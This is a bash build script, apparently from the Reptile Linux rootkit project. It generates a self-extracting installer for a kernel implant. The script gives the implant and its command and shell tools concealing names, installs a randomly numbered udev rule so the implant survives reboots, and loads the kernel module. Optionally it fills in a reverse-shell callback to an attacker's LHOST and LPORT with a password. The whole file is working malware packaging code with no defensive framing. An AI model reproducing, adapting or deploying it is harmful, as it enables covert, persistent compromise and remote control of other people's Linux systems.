#!/bin/bash

set -exo pipefail

function random_gen_dec {
    RETVAL=$(shuf -i 50-99 -n 1)
}

PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)"
[ $? -ne 0 ] && PWD="$(cd "$(dirname $0)" && pwd)"
source "${BASH_SOURCE%/*}/../.config" ||
    {
        echo "Error: no .config file found!"
        exit
    }

UDEV_DIR=/lib/udev
random_gen_dec && NAME=$RETVAL-$HIDE.rules
RULE=/lib/udev/rules.d/$NAME
[ ! -d /lib/udev/rules.d ] && RULE=/etc/udev/rules.d/$NAME


#Create empty payload file
PAYLOAD_FILE=$PWD/../output/payload_install.sh
touch $PAYLOAD_FILE
echo '#!/bin/bash' > $PAYLOAD_FILE

# Write: Create Reptile's folder
echo "mkdir -p $INSTALL_DIR" >>$PAYLOAD_FILE

# cp and rename files before put in Tar
cp $PWD/../output/cmd $PWD/../output/$HIDE"_cmd"
cp $PWD/../output/shell $PWD/../output/$HIDE"_shell"
cp $PWD/../scripts/bashrc $PWD/../output/$HIDE"_rc"
cp $PWD/../userland/transport/server-certificate.pem $PWD/../output/$HIDE"_cert.pem"
cp $PWD/../scripts/start $PWD/../output/$HIDE"_start"
sed s!\#IMPLANT!$INSTALL_DIR/$HIDE! $PWD/../scripts/rule >$PWD/../output/$NAME


# Copy and rename kernel implant
if [ ! -f $PWD/../output/$HIDE ]; then
cp $PWD/../output/reptile $PWD/../output/$HIDE;
fi

sed -i s!XXXXX!$TAG_NAME! $PWD/../output/$HIDE"_start"
sed -i s!\#CMD!$INSTALL_DIR/$HIDE"_cmd"! $PWD/../output/$HIDE"_start"
if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
    sed -i s!\#SHELL!$INSTALL_DIR/$HIDE"_shell"! $PWD/../output/$HIDE"_start"
    sed -i s!LHOST!$LHOST! $PWD/../output/$HIDE"_start"
    sed -i s!LPORT!$LPORT! $PWD/../output/$HIDE"_start"
    sed -i s!PASS!$PASSWORDk! $PWD/../output/$HIDE"_start"
    sed -i s!INTERVAL!$INTERVAL! $PWD/../output/$HIDE"_start"
    true || false
fi

# Tar output files
tar --owner=0 --group=0 -czf $PWD/../output/payload.tar.gz $PWD/../output/${HIDE} $PWD/../output/${HIDE}_cmd $PWD/../output/${HIDE}_shell $PWD/../output/${HIDE}_rc $PWD/../output/${HIDE}_cert.pem $PWD/../output/${HIDE}_start $PWD/../output/$HIDE $PWD/../output/$NAME

#Write: extraction.

echo 

cat >>$PAYLOAD_FILE <<\EOF
match=$(grep --text --line-number '^PAYLOAD:$' $0 | cut -d ':' -f 1)
payload_start=$((match + 1))
EOF


echo 'tail -n +$payload_start $0 | tar -xzvf - --strip-components=1 -C '"${INSTALL_DIR}" >> $PAYLOAD_FILE

# Write: Make persistent
echo "mv $INSTALL_DIR/$NAME $RULE" >>$PAYLOAD_FILE

# Write: Permissions
echo "chmod 711 $INSTALL_DIR/*" >>$PAYLOAD_FILE

# Write: Load Reptile
echo "$INSTALL_DIR/$HIDE" >>$PAYLOAD_FILE

cat >>$PAYLOAD_FILE <<\EOF
echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
EOF

# Write How to Uninstall
cat >>$PAYLOAD_FILE <<EOF
echo -e "UNINSTALL:\n"
echo -e "$INSTALL_DIR/$HIDE""_cmd show"
echo -e "rmmod reptile_module"
echo -e "rm -rf $INSTALL_DIR $RULE"
echo

exit 0

EOF

# Write tar payload to output script

echo "PAYLOAD:" >>$PAYLOAD_FILE

cat $PWD/../output/payload.tar.gz >> $PAYLOAD_FILE
mv $PAYLOAD_FILE $PWD/../

# cleaning output dir
#rm -rf $PWD/../output
